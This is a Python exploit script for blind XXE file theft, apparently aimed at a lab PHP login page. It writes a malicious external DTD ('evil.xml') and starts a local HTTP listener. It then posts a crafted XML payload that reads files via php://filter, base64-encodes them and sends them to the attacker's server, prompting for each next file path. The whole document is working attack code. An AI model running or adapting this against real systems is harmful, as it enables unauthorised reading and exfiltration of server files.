from http.server import HTTPServer, CGIHTTPRequestHandler
import threading
import requests


def web_server():
    port = 3344
    httpd = HTTPServer(('', port), CGIHTTPRequestHandler)
    print("[*]Starting simple_httpd on port: ", httpd.server_port)
    httpd.serve_forever()


def send_data():
    files = "c:/test.txt"
    while True:
        data = "<!DOCTYPE a[\n<!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=" + files + "\">\n<!ENTITY % dtd SYSTEM \"http://192.168.155.3:3344/evil.xml\">\n%dtd;\n%send;\n]>"
        requests.post("http://192.168.155.4/xxe-lab/php_xxe/doLogin.php", data=data)
        files = input("please input file: ")

if __name__ == "__main__":
    file = open('evil.xml', 'w')
    file.write("<!ENTITY % payload \"<!ENTITY &#x25; send SYSTEM 'http://192.168.155.3:3344/?content=%file;'>\"> %payload;")
    file.close()

    t1 = threading.Thread(target=web_server)
    t1.start()

    t2 = threading.Thread(target=send_data)
    t2.start()
